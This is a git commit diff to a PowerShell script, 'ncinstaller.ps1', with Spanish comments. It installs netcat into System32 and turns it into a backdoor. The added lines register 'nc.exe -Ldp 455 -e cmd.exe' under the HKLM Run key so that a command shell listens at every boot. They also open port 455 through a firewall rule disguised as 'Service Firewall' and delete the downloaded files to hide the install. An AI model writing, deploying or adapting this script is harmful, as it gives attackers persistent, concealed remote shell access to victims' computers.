9163bd7ee5c22158f599fb168c0be73ecb17889c
alariordas <80034759+alariordas@users.noreply.github.com>
2023-09-14 12:50:51 +0200

    Update ncinstaller.ps1

--- ncinstaller.ps1
+++ ncinstaller.ps1
@@ -1,7 +1,10 @@
 function DescargarYDescomprimirNetcat {
+    # Obtiene el nombre de usuario actual
+    $usuarioActual = $env:USERNAME
+
     # COMANDO DE DESCARGA: Descargar y descomprimir el archivo ZIP
-    $zipFilePath = "C:\Users\daw1xx\Downloads\netcat-win32-1.11.zip"
-    $destinationPath = "C:\Users\daw1xx\Downloads"
+    $zipFilePath = "C:\Users\$usuarioActual\Downloads\netcat-win32-1.11.zip"
+    $destinationPath = "C:\Users\$usuarioActual\Downloads\netcat-1.11"
 
     # Descargar el archivo ZIP
     Invoke-WebRequest -Uri "URL_DEL_ARCHIVO_ZIP" -OutFile $zipFilePath
@@ -15,4 +18,14 @@ function DescargarYDescomprimirNetcat {
 
     # Mover nc.exe a la carpeta System32
     Move-Item -Path $ncFilePath -Destination $system32Path
+
+    # ARRANQUE AL INICIO DEL SISTEMA
+    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\nc.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f
+
+    # //ACTIVAR PERSIMOS DE FIREWALL
+    netsh advfirewall firewall add rule name="Service Firewall" dir=in action=allow protocol=TCP localport=455 enable=yes
+
+    # BORRAR EL ZIP Y LA CARPETA
+    Remove-Item -Path $ncFilePath -Force
+    Remove-Item -Path $zipFilePath -Force
 }
